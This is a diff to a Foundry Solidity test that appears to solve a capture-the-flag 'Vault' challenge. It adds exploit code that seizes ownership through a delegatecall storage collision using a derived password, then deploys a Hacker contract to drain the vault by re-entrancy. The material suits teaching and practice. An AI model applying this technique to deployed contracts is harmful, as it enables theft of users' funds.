@@ -3,6 +3,7 @@ pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
 import "../src/Vault.sol";
+import "../src/Hacker.sol";
 
 
 
@@ -31,6 +32,21 @@ contract VaultExploiter is Test {
         vm.startPrank(palyer);
 
         // add your hacker code.
+        //1. open withdraw
+        //call changeOwner via delegatecall
+        bytes32 password = bytes32(uint256(uint160(address(logic))));
+        bytes memory signatureSelectorChangeOwner = abi.encodeWithSignature("changeOwner(bytes32,address)", password, palyer);
+        (bool success, ) = address(vault).call(signatureSelectorChangeOwner);
+        require(success, "change owner failed");
+        vault.openWithdraw();
+
+
+
+        //2. starting re-entrancy attack
+        Hacker hacker = new Hacker(address(vault));
+        address(hacker).call{value: 0.2 ether}("");
+        hacker.hack();
+        
 
         require(vault.isSolve(), "solved");
         vm.stopPrank();
